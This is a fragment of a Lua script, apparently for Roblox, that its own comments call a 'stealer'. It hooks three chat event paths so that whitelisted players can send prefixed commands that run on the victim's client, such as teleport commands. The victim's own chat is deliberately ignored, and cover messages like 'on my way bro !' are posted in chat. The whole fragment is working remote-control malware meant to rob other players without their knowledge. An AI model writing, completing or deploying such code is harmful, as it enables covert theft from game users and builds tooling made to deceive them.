-- 9. CHAT HOOK — LISTENS TO WHITELISTED PLAYERS ONLY  (your ticket #1)
--    Victim's own chat NEVER fires a command. Only other players whose name
--    is in WHITELIST can drive the stealer. LP.Chatted path removed.
-- =============================================================================
local function handleCommand(message, fromPlayer)
    if type(message) ~= "string" then return end
    if message:sub(1, 1) ~= CHAT_PREFIX then return end
    if not isWhitelisted(fromPlayer) then return end    -- hard gate

    local body = message:sub(2)
    local cmd, args = body:match("^(%S+)%s*(.*)")
    if not cmd then return end
    cmd = cmd:lower()
    local fn = COMMANDS[cmd]
    if not fn then return end

    if cmd == "tp" then sayMessage("on my way bro !") else sayMessage("Working on it...") end

    task.spawn(function()
        pcall(fn, args)
    end)
end

-- Path A: OnIncomingMessage (TextChatService)
pcall(function()
    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local old = TextChatService.OnIncomingMessage
        TextChatService.OnIncomingMessage = function(message)
            if message and message.TextSource then
                local guid = message.MessageId or tostring(message.TextSource.UserId) .. ":" .. tostring(message.Text)
                if guid and not handledGuids[guid] then
                    handledGuids[guid] = true
                    task.delay(5, function() handledGuids[guid] = nil end)
                    local speaker = Players:GetPlayerByUserId(message.TextSource.UserId)
                    handleCommand(message.Text, speaker)
                end
            end
            if old then
                local ok, r = pcall(old, message)
                if ok then return r end
            end
            return Enum.TextChatMessageStatus.Success
        end
    end
end)

-- Path B: MessageReceived signal
pcall(function()
    if TextChatService then
        TextChatService.MessageReceived:Connect(function(message)
            if not message or not message.TextSource then return end
            local guid = message.MessageId or tostring(message.TextSource.UserId) .. ":" .. tostring(message.Text)
            if guid and not handledGuids[guid] then
                handledGuids[guid] = true
                task.delay(5, function() handledGuids[guid] = nil end)
                local speaker = Players:GetPlayerByUserId(message.TextSource.UserId)
                handleCommand(message.Text, speaker)
            end
        end)
    end
end)

-- Path C: per-player Chatted (works for both chat systems, per speaker)
pcall(function()
    local function hookPlayer(p)
        if p == LP then return end        -- never our own chat
        p.Chatted:Connect(function(message)
            handleCommand(message, p)
        end)
    end
    for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
    Players.PlayerAdded:Connect(hookPlayer)
end)

